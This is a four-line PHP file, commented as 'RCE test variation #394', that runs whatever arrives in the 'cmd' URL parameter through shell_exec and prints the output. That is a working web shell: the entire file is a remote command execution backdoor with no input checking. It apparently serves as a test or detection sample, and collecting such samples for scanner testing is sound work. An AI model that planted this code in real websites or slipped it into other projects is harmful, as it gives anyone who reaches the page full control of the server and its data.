<?php
// RCE test variation #394
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>